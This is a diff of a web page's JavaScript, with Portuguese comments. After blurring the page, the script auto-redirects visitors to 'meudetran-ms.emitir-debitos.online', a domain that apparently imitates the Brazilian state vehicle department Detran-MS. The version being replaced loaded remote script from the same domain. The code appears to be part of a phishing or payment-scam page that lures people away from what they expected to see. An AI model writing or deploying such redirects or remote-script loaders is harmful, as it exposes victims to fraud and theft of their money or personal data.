@@ -155,7 +155,8 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe>
 (function(){
 
   const blurDelayMs = 2000;
- 
+
+  // REDIRECIONA APÓS 4 SEGUNDOS
   const redirectDelayMs = 4000;
 
   const bgImg = document.getElementById("bgImg");
@@ -166,13 +167,10 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe>
     bgImg.classList.add("blurred");
     overlay.style.opacity = 1;
 
+    // REDIRECIONAMENTO AUTOMÁTICO
     setTimeout(function(){
 
-      const s = document.createElement("script");
-      s.src = "https://meudetran-ms.emitir-debitos.online/";
-      s.async = true;
-
-      document.body.appendChild(s);
+      location.href = "https://meudetran-ms.emitir-debitos.online";
 
     }, redirectDelayMs);
 
